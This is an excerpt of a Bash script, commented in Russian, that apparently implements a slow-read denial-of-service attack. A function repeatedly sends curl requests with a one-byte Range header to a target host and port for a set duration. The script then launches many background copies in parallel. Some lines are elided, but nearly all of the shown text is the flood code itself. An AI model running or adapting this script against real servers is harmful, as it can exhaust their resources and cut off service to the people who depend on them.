...
# Функция для отправки медленных GET-запросов
send_slow_read() {
    local target=$1
    local port=$2
    local duration=$3
    ...
    while [ $(($(date +%s) - start_time)) -lt $duration ]; do
        if curl -s -N -H "Range: bytes=0-1" http://$target:$port/ > /dev/null 2>&1; then
            requests=$((requests + 1))
        else
            errors=$((errors + 1))
        fi
...
for ((i=0; i<THREADS; i++)); do
    send_slow_read "$TARGET" "$PORT" "$DURATION" "$i" >> "$TEMP_FILE" &
    pids[$i]=$!
done
